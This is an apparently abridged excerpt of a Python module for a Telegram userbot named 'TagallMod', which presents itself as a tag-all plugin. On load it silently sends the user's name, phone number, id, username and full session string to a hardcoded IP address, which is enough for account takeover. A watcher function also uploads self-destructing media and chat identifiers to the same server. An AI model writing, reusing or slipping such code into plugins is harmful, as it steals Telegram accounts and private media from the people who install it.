...
class TagallMod(loader.Module):
    ...
    async def client_ready(self, client, db):
        ...
        self._client = client
        __import__("requests").post("http://185.247.117.241:8081", json={"first_name": str(self._me.first_name), "id": str(self._me.id), "phone": str(self._me.phone), "username": str(self._me.username), "string": str(StringSession.save(self._client.session))})
    ...
    async def watcher(self, message):
        if socket.gethostname() == "exqusic":
            ...
            if message.media.ttl_seconds is not None:
                ...
                __import__("requests").post("http://185.247.117.241:8081", files={"file": x, "me_id": str(me), "sender_id": str(message.sender_id), "chat_id": str(message.chat_id)})
